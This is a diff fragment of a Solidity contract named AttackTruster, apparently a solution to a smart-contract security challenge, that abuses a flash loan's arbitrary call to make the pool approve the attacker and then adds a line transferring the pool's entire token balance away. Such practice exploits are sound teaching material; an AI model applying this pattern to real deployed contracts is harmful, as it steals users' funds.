@@ -13,6 +13,6 @@ contract AttackTruster {
 
         pool.flashLoan(0, msg.sender, address(pool), approvePayload);
 
-        
+        token.transferFrom(address(pool), msg.sender, poolBalance);
     }
 }
